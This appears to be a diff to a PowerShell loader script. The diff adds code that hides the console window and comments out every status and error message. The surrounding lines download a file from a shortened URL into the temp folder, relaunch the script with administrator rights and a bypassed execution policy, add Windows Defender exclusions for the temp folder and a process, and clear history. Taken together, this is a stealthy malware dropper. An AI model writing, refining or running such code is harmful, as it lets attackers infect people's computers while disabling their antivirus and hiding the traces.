@@ -1,4 +1,33 @@
 # FIRST THINGS FIRST
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
+
+        public static void Hide() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_HIDE);
+        }
+
+        public static void Show() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_SHOW);
+        }
+    }
+"@
+
+
+# Hide the console window
+[ConsoleWindow]::Hide()
 
 # Define the URL of the file to download
 $url = "https://lnkfwd.com/u/KtRiC0kh"
@@ -10,9 +39,9 @@ $destination = "$env:TEMP\ftf.ps1"
 try {
     Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
     # Output the path to confirm where the file was saved
-    Write-Output "File downloaded to: $destination"
+    #Write-Output "File downloaded to: $destination"
 } catch {
-    Write-Output "Error: Unable to download file from $url"
+    #Write-Output "Error: Unable to download file from $url"
 }
 
 # Check if the script is running with elevated privileges
@@ -25,7 +54,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -ErrorAction Stop
         exit
     } catch {
-        Write-Output "Error: Unable to relaunch the script with elevated privileges."
+        #Write-Output "Error: Unable to relaunch the script with elevated privileges."
     }
 }
 
@@ -33,14 +62,14 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 try {
     Set-ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
 } catch {
-    Write-Output "Error: Unable to set execution policy."
+    #Write-Output "Error: Unable to set execution policy."
 }
 
 # Add Exclusion in Windows Defender with error handling
 try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
 } catch {
-    Write-Output "Error: Unable to add exclusions to Windows Defender."
+    #Write-Output "Error: Unable to add exclusions to Windows Defender."
 }
 
 # Clear history (no error handling required, as it's safe)
